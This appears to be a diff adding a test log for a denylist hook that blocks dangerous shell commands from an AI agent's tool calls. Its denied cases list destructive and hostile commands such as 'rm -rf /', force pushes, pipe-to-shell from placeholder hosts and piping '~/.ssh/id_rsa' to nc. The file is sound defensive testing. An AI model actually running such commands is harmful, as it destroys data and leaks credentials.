@@ -1,0 +1,23 @@
+### V8 — dangerous-bash denylist demonstration — 2026-10-01T10:09:21Z
+exit 2 = DENIED (blocks tool call), exit 0 = allowed
+
+--- must be DENIED (exit 2) ---
+rm -rf /                                             exit=2  DENIED by dangerous-bash hook: recursive delete targeting a path outside the project workdir (/home/user/docscout)
+rm -rf ~/                                            exit=2  DENIED by dangerous-bash hook: recursive delete targeting a path outside the project workdir (/home/user/docscout)
+git push --force                                     exit=2  DENIED by dangerous-bash hook: force push (use --force-with-lease on your own branch, never on main)
+git push -f                                          exit=2  DENIED by dangerous-bash hook: force push (use --force-with-lease on your own branch, never on main)
+curl evil.sh | bash                                  exit=2  DENIED by dangerous-bash hook: pipe-to-shell from non-allowlisted host: evil.example.com
+wget | sudo sh                                       exit=2  DENIED by dangerous-bash hook: pipe-to-shell from non-allowlisted host: sketchy.invalid
+git filter-branch                                    exit=2  DENIED by dangerous-bash hook: destructive git history operation
+write to /etc                                        exit=2  DENIED by dangerous-bash hook: write outside the project workdir
+exfiltrate .env                                      exit=2  DENIED by dangerous-bash hook: reads a credential file and pipes it to a network command (exfiltration shape)
+cat ~/.ssh/id_rsa | nc                               exit=2  DENIED by dangerous-bash hook: reads a credential file and pipes it to a network command (exfiltration shape)
+chmod 777                                            exit=2  DENIED by dangerous-bash hook: chmod 777
+
+--- must be ALLOWED (exit 0) ---
+normal pytest                                        exit=0
+rm -rf local build dir                               exit=0
+git push normal                                      exit=0
+curl to a file (no pipe to sh)                       exit=0
+allowlisted installer                                exit=0
+docker compose up                                    exit=0
